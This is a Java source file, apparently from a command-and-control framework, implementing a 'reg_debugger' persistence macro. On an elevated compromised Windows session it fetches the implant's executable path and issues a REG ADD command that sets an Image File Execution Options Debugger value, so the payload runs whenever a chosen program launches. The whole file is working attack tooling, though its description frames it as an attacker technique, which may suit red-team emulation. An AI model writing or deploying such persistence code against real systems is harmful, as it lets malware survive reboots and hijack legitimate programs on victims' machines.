package c2.session.macro.persistence;

import c2.Commands;
import c2.WindowsConstants;
import c2.session.macro.AbstractCommandMacro;
import c2.session.macro.MacroOutcome;
import c2.win.WindowsCmdLineHelper;

public class RegistryDebugger extends AbstractCommandMacro {

	public static String COMMAND = "reg_debugger";
	
	public static String HELP = COMMAND + " <name of EXE to attach>";
	
	private static String REG_COMMAND = "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$TARGET_EXE$\" /v Debugger /d \"$PAYLOAD_EXE$\""; 
	
	@Override
	public boolean isCommandMatch(String cmd) {
		return cmd.startsWith(COMMAND + " ");
	}

	@Override
	public MacroOutcome processCmd(String cmd, int sessionId, String sessionStr) {
		MacroOutcome outcome = new MacroOutcome();
		String elements[] = cmd.split(" ");
		if(elements.length != 2) {
			outcome.addError(HELP);
		}else {
			if(WindowsCmdLineHelper.isClientElevated(sessionId, io)) {
				String targetCmd = elements[1];
				String thisCommand = REG_COMMAND.replace("$TARGET_EXE$", targetCmd);
				sendCommand(Commands.CLIENT_GET_EXE_CMD, sessionId, outcome);
				String clientCmd = awaitResponse(sessionId, outcome);
				clientCmd = clientCmd.replace("\r", "");
				clientCmd = clientCmd.replace("\n", "");
				thisCommand = thisCommand.replace("$PAYLOAD_EXE$", clientCmd);
				sendCommand(thisCommand, sessionId, outcome);
				clientCmd = awaitResponse(sessionId, outcome);
				if(clientCmd.contains(WindowsConstants.WINDOWS_SYSTEM_OPERATION_COMPLETE_MSG)) {
					outcome.addMacroMessage("Success!");
				}else {
					outcome.addError("Macro unsuccessful");
				}
			}else {
				outcome.addError("Failure: Must be running from an elevated session to write to HKLM");
			}
		}
		return outcome;
	}

	@Override
	public String getReadableName() {
		return "Registry Debugger Persistence Macro";
	}

	@Override
	public String getInvocationCommandDescription() {
		return HELP;
	}

	@Override
	public String getBehaviorDescription() {
		return "This macro utilizes the Windows feature to allow a process to be launched instead of another to serve as a debugger. This is not a particularly stealth persistence method, but some attackers will use it. Requires an elevated session.";
	}

}
